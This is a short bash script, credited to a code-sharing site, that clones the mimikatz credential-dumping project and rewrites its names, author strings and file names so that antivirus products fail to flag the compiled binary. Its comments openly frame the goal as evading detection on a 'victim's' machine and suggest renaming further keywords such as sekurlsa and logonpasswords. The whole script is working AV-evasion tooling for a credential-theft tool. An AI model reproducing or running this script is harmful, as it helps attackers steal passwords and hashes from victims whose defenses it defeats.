## CREDITS http://codegists.com/code/mimikatz%20obfuscator/

# This script downloads and slightly "obfuscates" the mimikatz project.
# Most AV solutions block mimikatz based on certain keywords in the binary like "mimikatz", "gentilkiwi", "benjamin@gentilkiwi.com" ..., 
# so removing them from the project before compiling gets us past most of the AV solutions.
# We can even go further and change some functionality keywords like "sekurlsa", "logonpasswords", "lsadump", "minidump", "pth" ....,
# but this needs adapting to the doc, so it has not been done, try it if your victim's AV still detects mimikatz after this program.
# I replaced "mimikatz" by "zwan" (no, I'm not germain), I recommand you change that so that zwan doesn't get flaged by AVs.
 
git clone https://github.com/gentilkiwi/mimikatz.git zwan
mv zwan/mimikatz zwan/zwan

find zwan/ -type f -print0 | xargs -0 sed -i 's/mimikatz/zwan/g'
find zwan/ -type f -print0 | xargs -0 sed -i 's/MIMIKATZ/zwan/g'
find zwan/ -type f -print0 | xargs -0 sed -i 's/Mimikatz/zwan/g'
find zwan/ -type f -print0 | xargs -0 sed -i 's/DELPY/DOE/g'
find zwan/ -type f -print0 | xargs -0 sed -i 's/Benjamin/John/g'
find zwan/ -type f -print0 | xargs -0 sed -i 's/benjamin@gentilkiwi.com/johndoe@example.com/g'
find zwan/ -type f -print0 | xargs -0 sed -i 's/creativecommons/python/g'
find zwan/ -type f -print0 | xargs -0 sed -i 's/gentilkiwi/hoyhayhay/g'
find zwan/ -type f -print0 | xargs -0 sed -i 's/KIWI/MANGO/g'
find zwan/ -type f -print0 | xargs -0 sed -i 's/Kiwi/Mango/g'
find zwan/ -type f -print0 | xargs -0 sed -i 's/kiwi/mango/g'
find zwan/ -type f -name '*mimikatz*' | while read FILE ; do
    newfile="$(echo ${FILE} |sed -e 's/mimikatz/zwan/g')";
    mv "${FILE}" "${newfile}";
done
find zwan/ -type f -name '*kiwi*' | while read FILE ; do
    newfile="$(echo ${FILE} |sed -e 's/kiwi/mango/g')";
    mv "${FILE}" "${newfile}";
done
